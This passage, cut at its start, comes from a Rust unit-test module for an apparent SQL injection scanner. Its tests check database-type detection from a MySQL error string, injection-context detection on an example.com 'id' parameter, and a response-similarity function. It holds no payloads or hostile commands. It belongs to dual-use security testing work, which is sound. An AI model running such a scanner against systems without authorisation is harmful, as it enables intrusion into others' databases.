        rt.block_on(async {
            let client = Arc::new(HttpClient::new(10, 3).unwrap());
            let scanner = EnhancedSqliScanner::new(client);

            let mysql_response = HttpResponse {
                status_code: 200,
                body: "MySQL error: syntax error".to_string(),
                headers: HashMap::new(),
                duration_ms: 100,
            };

            let db_type = scanner.detect_database_type(&mysql_response).await;
            assert_eq!(db_type, DatabaseType::MySQL);
        });
    }

    #[test]
    fn test_context_detection() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let client = Arc::new(HttpClient::new(10, 3).unwrap());
            let scanner = EnhancedSqliScanner::new(client);

            let baseline = HttpResponse {
                status_code: 200,
                body: String::new(),
                headers: HashMap::new(),
                duration_ms: 100,
            };

            let context = scanner.detect_injection_context("http://example.com?id=123", "id", &baseline).await;
            assert_eq!(context, InjectionContext::Numeric);
        });
    }

    #[test]
    fn test_content_similarity() {
        let client = Arc::new(HttpClient::new(10, 3).unwrap());
        let scanner = EnhancedSqliScanner::new(client);

        assert_eq!(scanner.calculate_content_similarity("hello", "hello"), 1.0);

        let sim = scanner.calculate_content_similarity("abc", "xyz");
        assert!(sim < 0.5);
    }
}
